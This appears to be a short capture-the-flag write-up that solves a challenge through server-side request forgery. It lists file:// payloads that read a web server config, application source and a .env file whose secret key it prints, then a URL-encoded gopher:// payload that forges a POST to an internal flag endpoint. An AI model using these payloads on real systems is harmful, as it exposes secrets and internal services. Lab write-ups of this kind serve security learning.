# nextGen 1

## Write-up (brief)

- service=file:///etc/apache2/sites-enabled/000-default.conf
- service=file:///var/www/secret-service/app.wsgi
- service=file:///var/www/secret-service/app.py
- service=file:///var/www/secret-service/.env --> SECRET_KEY=b7bb70a3b3c95f570a8d31ece41bf7c5
- service=gopher://localhost:5000//POST%2520%252Fflag%2520HTTP%252F1.1%250AContent-Type%253A%2520application%252Fjson%250AContent-Length%253A%252046%250A%250A%257B%2522secret%2522%253A%2522b7bb70a3b3c95f570a8d31ece41bf7c5%2522%257D%250A


## Flag

`shellmates{go_go_go_GoOOOPHER}`
